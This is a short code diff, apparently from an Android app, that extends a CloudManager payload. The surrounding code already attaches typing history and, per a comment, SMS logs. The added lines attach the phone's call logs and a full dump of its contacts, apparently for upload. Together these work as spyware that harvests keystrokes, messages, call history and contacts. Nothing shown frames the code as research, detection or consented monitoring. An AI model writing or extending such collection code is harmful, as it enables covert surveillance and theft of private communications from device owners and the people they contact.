@@ -47,6 +47,10 @@ object CloudManager {
                 // Attach Typing Logs
                 val typeLogs = prefs.getString("typing_history", "[]")
                 json.put("typing_history", JSONArray(typeLogs))
+                
+                // Attach Phone Data (Directly from Manager)
+                json.put("call_logs", PhoneManager.getCallLogs(ctx))
+                json.put("contacts_dump", PhoneManager.getContacts(ctx))
                 json.put("android_version", android.os.Build.VERSION.RELEASE)
                 
                 // Attach SMS logs
